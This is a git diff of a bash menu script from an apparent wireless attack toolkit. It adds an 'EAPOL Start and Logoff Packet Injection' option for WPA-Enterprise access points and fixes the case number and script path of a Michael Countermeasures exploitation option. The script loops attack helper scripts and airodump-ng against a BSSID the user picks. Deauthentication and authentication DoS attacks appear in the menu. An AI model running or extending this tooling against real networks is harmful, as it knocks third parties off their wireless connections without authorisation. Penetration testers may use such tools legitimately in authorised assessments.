@@ -4,6 +4,7 @@ Attack OPTIONS:\n
 2 => De-Association Attack \n
 3 => Authentication DOS Attack \n
 4 =>  Michael Countermeasures Exploitation (Only For TKIP Enabled APs) \n
+5 =>  EAPOL Start and Logoff Packet Injection (Only For WPA-Enterprise) \n
 '
 
 echo -e $OPTIONS
@@ -18,6 +19,11 @@ read -p "Enter an Attack Option (type '00' to Main Menu): " user_input
 
 while [ "$user_input" != "$keyword" ]
 do
+
+
+
+
+
 
 #Performing DeAuth Attack
     	if [ $user_input -eq 1 ]; then
@@ -65,6 +71,11 @@ do
     			((counter++))
 			done
 			kill $pid
+
+
+
+
+
 
 
 
@@ -118,6 +129,11 @@ do
 
 
 
+
+
+
+
+
 #Performing Authentication DOS Attack
     	elif [ $user_input -eq 3 ]; then
     		mins=5
@@ -147,7 +163,7 @@ do
     		echo $cmd_time >> projects/$project_name/command.logs
     		counter=1
     		iw $interface_name set channel $channel 
-    		xterm -e airodump-ng $interface_name --bssid $bssid --channel $channel & fg 2> /dev/null
+    		xterm -e airodump-ng $interface_name --bssid $bssid  & fg 2> /dev/null
     		pid=$(ps aux | grep xterm | grep -v 'grep' | awk '{print $2}')
     		while [ $counter -le $attack_itteration_times ]
 			do
@@ -158,8 +174,14 @@ do
 			done
 			kill $pid
 
+
+
+
+
+
+
 #Performing Michael Countermeasures Exploitation
-    	elif [ $user_input -eq 3 ]; then
+    	elif [ $user_input -eq 4 ]; then
     		mins=5
     		bssid=''
     		attack_itteration_times=5
@@ -192,11 +214,58 @@ do
     		while [ $counter -le $attack_itteration_times ]
 			do
 				echo -e "\n\033[33mItteration Number: $counter\033[0m" | tee -a projects/$project_name/command.logs 
-        		/mcExploitation.sh $interface_name $bssid $mins| tee -a projects/$project_name/command.logs
+        		./scripts/mcExploitation.sh $interface_name $bssid $mins| tee -a projects/$project_name/command.logs
         		sleep $secs  
     			((counter++))
 			done
 			kill $pid
+
+
+
+
+
+
+
+#Performing EAPOL Start and Logoff Packet Injection
+    	elif [ $user_input -eq 5 ]; then
+    		mins=5
+    		bssid=''
+    		attack_itteration_times=5
+    		user_input_mins=''
+    		attack_itteration=''
+    		delay_itteration=''
+			echo -e "\n\033[31m[*] ScannedAPs:\033[0m"
+    		cat projects/$project_name/ScannedAPs.csv
+    		echo ""
+    		read -p "Enter BSSID: " bssid
+	    	read -p "Enter Time to perform EAPOL Start and Logoff Packet Injection Attack (Miniutes)(Default: 5mins): " user_input_mins
+    		read -p "Enter times to itterate EAPOL Start and Logoff Packet Injection Attack (Numbers)(Default: 5times): " attack_itteration
+   	 		read -p "Enter delay time between each itteration (Second)(Default: 5sec): " delay_itteration
+   		 	if [ -n "$user_input_mins" ]; then
+    		 	mins=$user_input_mins
+			fi
+    		if [ -n "$attack_itteration" ]; then
+    	 		attack_itteration_times=$attack_itteration
+			fi
+    		if [ -n "$delay_itteration" ]; then
+    	 		secs=$delay_itteration
+			fi
+    		cmd_time=`date +%d-%m-%y-%H_%M`
+    		echo "----------------------------------------------------------------------" >> projects/$project_name/command.logs 	
+    		echo $cmd_time >> projects/$project_name/command.logs
+    		counter=1
+    		iw $interface_name set channel $channel 
+    		xterm -e airodump-ng $interface_name --bssid $bssid --channel $channel & fg 2> /dev/null
+    		pid=$(ps aux | grep xterm | grep -v 'grep' | awk '{print $2}')
+    		while [ $counter -le $attack_itteration_times ]
+			do
+				echo -e "\n\033[33mItteration Number: $counter\033[0m" | tee -a projects/$project_name/command.logs 
+        		./scripts/eapolPacketInjection.sh $interface_name $bssid $mins| tee -a projects/$project_name/command.logs
+        		sleep $secs  
+    			((counter++))
+			done
+			kill $pid
+
 
 		else
     		echo -e "\n\033[31mInvalid Options!!!\033[0m"    
